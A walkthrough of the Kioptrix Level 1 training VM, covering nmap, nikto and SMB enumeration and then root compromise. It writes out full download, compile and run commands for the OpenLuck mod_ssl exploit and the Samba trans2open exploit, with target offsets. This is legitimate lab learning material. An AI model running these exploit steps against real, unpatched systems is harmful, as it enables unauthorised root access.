:monocle_face: :clock11:

> This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

## Initial recon
### Nmap scan

We start initial active recon with an TCP SYN (-sS) version (-sV) fast (-T4) aggressive (-A) scan of all TCP ports (-p-) and output to all formats (-oA).
Very Verbose output (-vv) to see live scanning results
```
sudo nmap -sS -sV -A -T4 -vv -p- -oA syn_ver_agg_alltcp_ports 10.0.2.15
```

We can also run a quick version UDP scan (-sUV) of the top 1000 ports to see if there is any interesting UDP ports.
```
sudo nmap -sUV -T4 -vv 10.0.2.15 -oA udp_fast_scan
```

Nothing much of the ordenary for UDP ports, looks as expected with RPC and SMB ports open.

## Web Server enumeration (Ports 80 and 443)

Going to the web servers default directory reveals the standard Apache Web Page running on Red Hat Linux.

Lets do some enumration web server using nikto and dirbuster.

The dirbuster scan did not reveal much. There was an mrtg (Multi Router Traffic Grapher) tool installed on the web server but it did not reveal much.

***http://10.0.2.15/mrtg/mrtg.html***

### Nikto scan

Run the following command and save the results to a file using tee if you wish.

```
nikto -h 10.0.2.15 | tee nikto_scan.txt
```

It appears that the Apache Server is quite outdated and there seems to be quite a few attack vectors we can make use of.

Of particular interest is this remote buffer overflow that could lead to a shell? Lets invetigate it further.
> + mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082

[CVE-2002-0082 Details](https://nvd.nist.gov/vuln/detail/CVE-2002-0082)
> The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.

Searching for mod_ssl on exploitdb.com reveals a few potential exploits.
The most promossing ones are
* [Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow](https://www.exploit-db.com/exploits/21671)
* [Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)](https://www.exploit-db.com/exploits/47080)

I tried to compile the first one but was met with compilation errors, I fixed a few but proceeded to get more errors.
I then found this exploit **OpenLuck** that was based off the orginal exploit but is fixed and works.

[OpenLuck Exploit GitHub](https://github.com/heltonWernik/OpenLuck)
 ```
# Download the source code
wget https://github.com/heltonWernik/OpenLuck/raw/master/OpenFuck.c

# install ssl-dev library dependancy
apt-get install libssl-dev

# Compile the exploit code
gcc -o OpenFuck OpenFuck.c -lcrypto

# Run the exploit and get a root shell.
./OpenFuck 0x6b 10.0.2.15 443 -c 40
```

The first parameter 0x6b represents the buffer overflow memory address offset value. You need to select which one matches the targets operating system.

In this case it is: **0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2**

The -c parameter is the number of open connections.

![OpenLuck Exploit](/Images/vh_kioptrix1_openluck_1.jpg)


## SMB Enumeration (Port 139)

The nmap scan did not reveal the samba version. There are a few ways to get this.
> 139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)

You can use the metasploit **auxiliary/scanner/smb/smb_version** module.

```
msfconsole
use auxiliary/scanner/smb/smb_version 
set RHOST <target ip>
run
```

![Metasploit SMB Version Scan](/Images/vh_kioptrix1_smb_msf1.jpg)

This tells us that its runnning **Unix (Samba 2.2.1a)**

What if you cant use metasploit for some reason?

A cooler way is to use ngrep and initate an null session connection using smbclient.

```
# -d is to specify the interface to listen on.
sudo ngrep -i -d eth1 's.?a.?m.?b.?a.*[[:digit:]]' port 139

# In another terminal open an SMB connection using smbclient and exit
echo exit | smbclient -L 10.0.2.15
```

![smbclient connection](/Images/vh_kioptrix1_smb_ngrep0.jpg)

You should be able to spot the samba smb verion as below.

![Ngrep Samba version](/Images/vh_kioptrix1_smb_ngrep1.jpg)

* Tip - If you running a fresh kail you might have to configure your samba configuration to be able to also use old SMB protocol versions.
```
sudo nano /etc/samba/smb.conf

#Insert the following lines under the [global] section.
client min protocol = CORE
client max protocol = SMB3

# Restart the SMB service
sudo systemctl restart smbd.service
````

The above tip will allow you to use smbclient and avoid this error. Enum4linux also works correctly when those settings are set.
> protocol negotiation failed: NT_STATUS_IO_TIMEOUT

```
enum4linux -a 10.0.2.15 | tee enum4linux_results.txt
```

Enum4linux did not reveal any interesting information thus the results are obmitted.

Ok so we now know the Samba verion (2.2.1.a) that is running on the target system.

If we check exploitdb.com we will find the following exploit which seems like it will affect our version also.

[Samba < 2.2.8 (Linux/BSD) - Remote Code Execution](https://www.exploit-db.com/exploits/10)

[CVE-2003-0201 Details](https://nvd.nist.gov/vuln/detail/CVE-2003-0201)

> Buffer overflow in the call_trans2open function in trans2.c for Samba 2.2.x before 2.2.8a, 2.0.10 and earlier 2.0.x versions, and Samba-TNG before 0.3.2, allows remote attackers to execute arbitrary code.

```
# Download the exploit code
wget https://www.exploit-db.com/download/10 -O sambal.c

# Compile the exploit
gcc -o sambal sambal.c

# Run the exploit and get a root shell
./sambal -b=0 -v 10.0.2.15
```

## Summary

Well I found two easy ways to gain root on this machine. It did involve a bit of enumeration and research to find and get the correct exploits to work.

There was this tiny bit of loot in the /var/mail/root directory. Guess we can expect a slightly more challanging system on Kioptrix Level 2 :smile:
